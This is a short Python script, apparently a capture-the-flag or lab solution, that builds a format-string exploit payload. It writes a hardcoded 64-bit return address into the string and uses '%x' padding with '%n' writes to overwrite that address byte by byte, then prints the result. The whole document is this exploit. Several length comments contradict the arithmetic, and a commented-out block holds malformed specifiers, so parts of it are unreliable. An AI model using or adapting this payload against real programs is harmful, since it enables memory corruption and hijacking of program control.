
ret_addr = "\xa2\xdf\xff\xff\xff\xff\xff\x7f"

def num_chars(v, l):
    n = v - l % 256
    n = n + 256 if n < 0 else n
    return str(n)

addr_overwrite = "e "
# string is 2 chars long
addr_overwrite += ''.join([chr((ord(ret_addr[0]) + i*16) % 256) + ret_addr[1::] + "beef" for i in range(0, 8)])
# string is (8 + 4)*8 + 2 = 98 chars long
addr_overwrite += "%8x"*4
# string is (8*4) + 98 = 130 chars long
addr_overwrite += '%' + num_chars(0xbd, 130)  + 'x%n'
# string is 130 + 59 = 189 chars long
addr_overwrite += '%' + num_chars(0x09, 189) + 'x%n'
# string is 320 + 201 = 421 chars long
addr_overwrite += '%' + num_chars(0x40, 265) + 'x%n'
# string is 521 + 180 = 701 chars long 
addr_overwrite += '%' + num_chars(0x00, 320) + 'x%n'
addr_overwrite += '%256x%n'*4
#addr_overwrite += '%' + num_chars(0x00, 768) + 'x%n'
#addr_overwrite += '%n' * 4
'''
addr_overwrite += "%8x"*4
addr_overwrite += "%4861%n"
addr_overwrite += "%76%n"#"%01%n"
addr_overwrite += "%01%n"
addr_overwrite += "%01%n"
'''

print(addr_overwrite)

